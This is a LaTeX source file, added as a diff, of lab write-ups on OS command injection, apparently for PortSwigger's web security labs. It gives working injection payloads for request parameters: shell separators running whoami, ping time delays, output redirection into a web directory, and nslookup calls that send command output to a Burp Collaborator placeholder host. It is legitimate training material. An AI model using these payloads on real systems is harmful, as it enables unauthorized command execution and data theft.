@@ -1,0 +1,263 @@
+\documentclass[11pt,a4paper]{article}
+
+% ----------------------------------
+% Packages
+% ----------------------------------
+\usepackage[T1]{fontenc}
+\usepackage[a4paper,top=2.1cm,bottom=2.1cm,left=2.25cm,right=2.25cm]{geometry}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage{fancyhdr}
+\usepackage{listings}
+
+% ----------------------------------
+% Document information
+% ----------------------------------
+\newcommand{\DocumentType}{Lab Writeups}
+\newcommand{\VulnerabilityTitle}{OS Command Injection}
+\newcommand{\ProjectTitle}{Command Injection Labs}
+\newcommand{\AuthorName}{Youssef Reda}
+
+% ----------------------------------
+% Colors and hyperlinks
+% ----------------------------------
+\definecolor{primary}{RGB}{25,55,95}
+\definecolor{secondary}{RGB}{75,95,120}
+\definecolor{linkblue}{RGB}{35,85,155}
+\definecolor{codebg}{RGB}{247,248,250}
+\definecolor{codeframe}{RGB}{210,216,224}
+
+\lstset{
+    basicstyle=\ttfamily\small,
+    backgroundcolor=\color{codebg},
+    frame=single,
+    rulecolor=\color{codeframe},
+    framesep=7pt,
+    xleftmargin=4pt,
+    xrightmargin=4pt,
+    aboveskip=8pt,
+    belowskip=8pt,
+    breaklines=true,
+    breakatwhitespace=false,
+    columns=fullflexible,
+    keepspaces=true,
+    showstringspaces=false,
+    tabsize=2
+}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=primary,
+    urlcolor=linkblue,
+    citecolor=primary,
+    pdftitle={\VulnerabilityTitle\space - \DocumentType},
+    pdfauthor={\AuthorName}
+}
+
+\urlstyle{same}
+
+% ----------------------------------
+% Paragraphs, lists, and headings
+% ----------------------------------
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{4pt}
+\setlist[itemize]{leftmargin=1.5em,itemsep=2pt,topsep=3pt}
+\setlist[enumerate]{leftmargin=1.8em,itemsep=2pt,topsep=3pt}
+
+\titleformat{\section}
+  {\Large\bfseries\color{primary}}{}{0pt}{}
+\titleformat{\subsection}
+  {\large\bfseries\color{secondary}}{}{0pt}{}
+\titleformat{\subsubsection}
+  {\normalsize\bfseries}{}{0pt}{}
+\titlespacing*{\section}{0pt}{16pt}{6pt}
+\titlespacing*{\subsection}{0pt}{11pt}{4pt}
+\titlespacing*{\subsubsection}{0pt}{8pt}{3pt}
+
+% Unnumbered headings that still appear in the Table of Contents.
+\newcommand{\nsection}[1]{%
+  \section*{#1}%
+  \phantomsection%
+  \addcontentsline{toc}{section}{#1}%
+}
+\newcommand{\nsubsection}[1]{%
+  \subsection*{#1}%
+  \phantomsection%
+  \addcontentsline{toc}{subsection}{#1}%
+}
+\newcommand{\nsubsubsection}[1]{%
+  \subsubsection*{#1}%
+  \phantomsection%
+  \addcontentsline{toc}{subsubsection}{#1}%
+}
+
+% ----------------------------------
+% Header and footer
+% ----------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textcolor{secondary}{Web Application Security Labs}}
+\fancyhead[R]{\small\textit{Command Injection Labs}}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0pt}
+\setlength{\headheight}{14pt}
+
+\begin{document}
+
+% ----------------------------------
+% Cover page
+% ----------------------------------
+\begin{titlepage}
+    \thispagestyle{empty}
+    \centering
+
+    \vspace*{1.8cm}
+    {\Large\color{secondary}\bfseries \DocumentType\par}
+
+    \vspace{0.8cm}
+    {\Huge\bfseries\color{primary}\VulnerabilityTitle\par}
+
+    \vfill
+    \begin{flushleft}
+        \vspace{0.6cm}
+        \textbf{Prepared by}\par
+        \AuthorName
+    \end{flushleft}
+\end{titlepage}
+
+% ----------------------------------
+% Contents
+% ----------------------------------
+\pagenumbering{roman}
+\tableofcontents
+\clearpage
+\pagenumbering{arabic}
+
+% ----------------------------------
+% Lab writeups
+% ----------------------------------
+
+\nsection{Lab 1: Basic OS Command Injection}
+
+\begin{enumerate}
+    \item Intercept a stock-check request using Burp Suite.
+
+    \item Modify the \texttt{productID} parameter by injecting the payload:
+
+          \begin{lstlisting}
+;whoami;
+    \end{lstlisting}
+
+    \item Forward the modified request and inspect the HTTP response.
+
+    \item Observe the output of \texttt{whoami} to identify the user running the application and confirm OS command injection.
+\end{enumerate}
+
+\vspace{0.5cm}
+
+\nsection{Lab 2: Blind OS Command Injection with Time Delays}
+
+\begin{enumerate}
+    \item Intercept the feedback submission request using Burp Suite.
+
+    \item Modify the \texttt{email} parameter using either of the following payloads.
+
+          \textbf{Payload 1:}
+          \begin{lstlisting}
+x||ping+-c+10+127.0.0.1||
+    \end{lstlisting}
+
+          \textbf{Payload 2:}
+          \begin{lstlisting}
+;ping+-c+10+127.0.0.1;
+    \end{lstlisting}
+
+    \item Forward the modified request and observe the response time.
+
+    \item Confirm that the response is delayed by approximately 10 seconds, indicating a blind OS command injection vulnerability.
+\end{enumerate}
+
+\newpage
+
+\nsection{Lab 3: Blind OS Command Injection with Output Redirection}
+
+\begin{enumerate}
+    \item Intercept the feedback submission request using Burp Suite.
+
+    \item Modify the \texttt{email} parameter using either of the following payloads.
+
+          \textbf{Payload 1:}
+          \begin{lstlisting}
+||whoami>/var/www/images/output.txt||
+    \end{lstlisting}
+
+          \textbf{Payload 2:}
+          \begin{lstlisting}
+;whoami+>/var/www/images/whoami.txt;
+    \end{lstlisting}
+
+    \item Forward the modified request to execute the command and redirect its output to a file in the writable images directory.
+
+    \item Intercept a product image request and modify the \texttt{filename} parameter to match the output filename.
+
+          \textbf{For Payload 1:}
+          \begin{lstlisting}
+filename=output.txt
+    \end{lstlisting}
+
+          \textbf{For Payload 2:}
+          \begin{lstlisting}
+filename=whoami.txt
+    \end{lstlisting}
+
+    \item Forward the request and inspect the response to retrieve the output of \texttt{whoami}.
+\end{enumerate}
+
+\vspace{0.5cm}
+
+\nsection{Lab 4: Blind OS Command Injection with Out-of-Band Interaction}
+
+\begin{enumerate}
+    \item Intercept the feedback submission request using Burp Suite.
+
+    \item Modify the \texttt{email} parameter with the following payload:
+
+          \begin{lstlisting}
+x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+    \end{lstlisting}
+
+    \item Right-click the request and select \texttt{Insert Collaborator payload} to replace \texttt{BURP-COLLABORATOR-SUBDOMAIN} with a valid Burp Collaborator subdomain.
+
+    \item Forward the modified request to trigger a DNS lookup.
+
+    \item Verify that the DNS interaction is received in Burp Collaborator to confirm the blind OS command injection.
+\end{enumerate}
+
+\vspace{0.5cm}
+
+\nsection{Lab 5: Blind OS Command Injection with Out-of-Band Data Exfiltration}
+
+\begin{enumerate}
+    \item Intercept the feedback submission request using Burp Suite Professional.
+
+    \item Open the Collaborator tab and copy a unique Burp Collaborator payload.
+
+    \item Modify the \texttt{email} parameter using the following payload, replacing the placeholder with your Collaborator subdomain:
+
+          \begin{lstlisting}
+||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+        \end{lstlisting}
+
+    \item Forward the modified request to execute the command.
+
+    \item Return to the Collaborator tab and click \texttt{Poll now}. Wait for the DNS interaction if necessary.
+
+    \item Inspect the interaction details and extract the username returned as part of the queried subdomain.
+
+    \item Submit the extracted username to complete the lab.
+\end{enumerate}
+
+\end{document}
